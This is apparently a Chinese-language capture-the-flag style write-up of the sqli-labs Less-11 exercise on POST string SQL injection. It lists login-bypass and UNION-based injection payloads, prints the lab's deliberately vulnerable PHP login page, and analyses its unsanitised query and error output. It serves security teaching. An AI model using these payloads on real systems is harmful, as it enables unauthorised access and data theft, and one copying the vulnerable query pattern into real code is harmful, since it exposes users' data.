# Less-11  **POST Error Based- String**
TAG：POST注入、字符串注入、万能密码
## 漏洞利用
这是个很典型的post注入，存在万能密码问题  
Payload:```Username:admin' # Password:1111```

![less11_1](images/Less11_1.png)  

万能密码的成功说明可以在Username进行注入  
先探测一下字段数  
Payload:```1' order by 1#```  
Payload:```1' order by 2#```  
Payload:```1' order by 3#```  

![less11_2](images/Less11_2.png)  
通过报错回显可知只存在两个字段  

用联合查询寻找一下回显点  
Payload:```1' union select 1,2#```
![less11_3](images/Less11_3.png)  
寻找到回显点后就可以进行注入获取信息了  
获取数据库名
payload:```1' union select 1,database()#```   

## 源码分析  
### less11源码： 
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Less-11- Error Based- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"> Welcome&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br></div>

<div  align="center" style="margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;">

<div style="padding-top:10px; font-size:15px;">
 

<!--Form to post the data for sql injections Error based SQL Injection-->
<form action="" name="form1" method="post">
	<div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;
	    <input type="text"  name="uname" value=""/>
	</div>  
	<div> Password  : &nbsp;&nbsp;&nbsp;
		<input type="text" name="passwd" value=""/>
	</div></br>
	<div style=" margin-top:9px;margin-left:90px;">
		<input type="submit" name="submit" value="Submit" />
	</div>
</form>

</div></div>

<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">
<font size="6" color="#FFFF00">





<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname);
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity 
	@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in\n\n " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		echo 'Your Login name:'. $row['username'];
		echo "<br>";
		echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"  />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysql_error());
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg" />';	
		echo "</font>";  
	}
}

?>


</font>
</div>
</body>
</html>
```
### 漏洞点分析：
```
$uname=$_POST['uname'];
$passwd=$_POST['passwd'];
```
此页面将通过post方式提交给它的uname和passwd放入变量uname,passwd中并用于页面处理  
```
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```
页面将获取到的参数uname,passwd直接放入sql操作语句中并提交给数据库操作，并没有对参数进行检测与过滤，这将导致万能密码问题和POST注入问题  

```
...
echo 'Your Login name:'. $row['username'];
echo "<br>";
echo 'Your Password:' .$row['password'];
...
```
页面将通过数据库查询语句查询到的信息直接显示了出来，这为注入提供了回显点，可以通过此处直接获取恶意语句返回的信息  
